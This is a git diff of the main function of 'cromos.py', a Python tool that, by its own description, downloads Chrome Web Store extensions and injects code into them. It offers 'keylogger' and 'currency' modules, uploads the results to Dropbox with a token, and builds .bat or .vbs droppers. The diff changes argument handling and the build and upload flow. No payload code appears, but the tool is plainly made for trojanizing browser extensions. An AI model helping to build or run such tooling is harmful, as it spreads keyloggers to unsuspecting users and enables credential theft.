@@ -37,9 +37,9 @@ def main() :
 		global extension, builds, token, modules
 
 		parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
-		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, required="true")
+		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str)
 		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
-		parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
+		parser.add_argument('--build', help='Build types .bat\n.vbs', type=str)
 		parser.add_argument('--token', help='Token for uploading files in Dropbox', type=str)
 
 		args = parser.parse_args()
@@ -56,7 +56,8 @@ def main() :
 	banner()
 	help()
 
-	download = Download(extension)
+	if extension:
+		download = Download(extension)
 
 	if modules == "currency" or modules == "keylogger" :
 		loader = Loader(extension, modules).inject()
@@ -66,11 +67,10 @@ def main() :
 			print("{} Token invalid, enter a valid.".format(color.error("[!]")))
 			sys.exit(1)
 		else :
-			Drive(extension, token).upload()
+			if builds == "bat" or builds == "vbs":
+				Drive(extension, token).upload()
+				pass
 			
-	if builds == "bat" or builds == "vbs":
-		builder = Build(extension, builds, token).builder()
-
 if __name__== "__main__" :
 
 	main()
